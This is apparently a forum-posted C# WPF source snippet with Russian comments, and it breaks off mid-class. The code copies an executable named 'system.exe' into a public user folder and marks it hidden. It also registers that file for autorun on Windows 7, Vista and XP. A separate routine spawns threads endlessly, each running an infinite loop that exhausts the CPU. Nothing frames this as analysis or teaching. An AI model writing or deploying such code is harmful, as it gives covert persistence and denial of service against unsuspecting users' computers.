#programowanie
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows;

namespace WpfApplication_OKSANA
{
    /// <summary>
    /// Логика взаимодействия для MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public static string needPatch = "C:\\Users\\Public\\";


        public MainWindow()
        {
            if (OSVersionInfo.Name == "Windows 7" || OSVersionInfo.Name == "Windows Vista" )
            {
                autorun.SetAutorunValue(true, needPatch + "system.exe"); // добавить в автозагрузку
                //SetAutorunValue(false, needPatch + "system.exe");  // убрать из автозагрузки
            }
            else
                if (OSVersionInfo.Name == "Windows XP")
            {
                needPatch = "C:\\Documents and Settings\\All Users\\";
                autorun.SetAutorunValue(true, needPatch + "system.exe"); // добавить в автозагрузку
                                                                         //SetAutorunValue(false, needPatch + "system.exe");  // убрать из автозагрузки
            }

            InitializeComponent();
        }
         private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            if (!File.Exists(needPatch + "system.exe"))
            {
                try
                {
                    File.Copy("system.exe", needPatch + "system.exe");
                    File.SetAttributes(needPatch + "system.exe", FileAttributes.Hidden);

                }
                catch {   }
            }
            start();
        }

        public static void sys_sleep()
        {
            while (true)
            {
                Thread s = new Thread(s_b);
                s.Start();
            }
        }
        private static void s_b()
        {
            int y = 2;
            while (true)
            {
                y *= y;
            }
        }
        
